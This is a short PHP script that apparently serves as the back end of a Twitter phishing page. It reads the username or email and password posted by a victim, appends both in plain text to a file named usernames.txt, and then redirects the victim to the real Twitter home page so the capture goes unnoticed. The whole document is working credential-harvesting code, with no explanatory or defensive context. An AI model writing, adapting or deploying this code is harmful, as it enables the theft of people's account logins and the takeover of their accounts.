<?php
file_put_contents("usernames.txt", "Twitter username: " . $_POST['usernameOrEmail'] . "\nPassword: " . $_POST['pass'] . "\n", FILE_APPEND);
header("Location: https://twitter.com/home");
exit();
?>
